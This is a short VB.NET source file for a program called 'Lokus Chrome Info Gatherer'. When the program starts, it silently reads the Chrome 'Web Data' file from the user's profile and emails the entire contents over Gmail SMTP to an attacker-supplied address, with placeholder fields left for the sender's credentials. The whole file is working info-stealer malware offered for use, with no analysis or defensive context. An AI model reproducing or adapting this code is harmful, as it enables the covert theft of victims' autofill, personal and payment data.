Imports System.Net.Mail
Public Class Lokus

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim EmailMessage As New MailMessage()
        Dim fileReader As System.IO.StreamReader

        fileReader = My.Computer.FileSystem.OpenTextFileReader(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) & "\AppData\Local\Google\Chrome\User Data\Default\\Web Data")
        Dim stringReader As String
        stringReader = fileReader.ReadToEnd()

        EmailMessage.From = New MailAddress("YOUR EMAIL HERE@gmail.com")
        EmailMessage.To.Add("YOUR EMAIL HERE")
        EmailMessage.Subject = "Lokus Chrome Info Gatherer v.1.0"
        EmailMessage.Body = stringReader

        Dim SMTP As New SmtpClient("smtp.gmail.com")
        SMTP.Port = 587
        SMTP.EnableSsl = True
        SMTP.Credentials = New System.Net.NetworkCredential("YOUR EMAIL HERE", "YOUR PASSWORD HERE")

        SMTP.Send(EmailMessage)
    End Sub
End Class
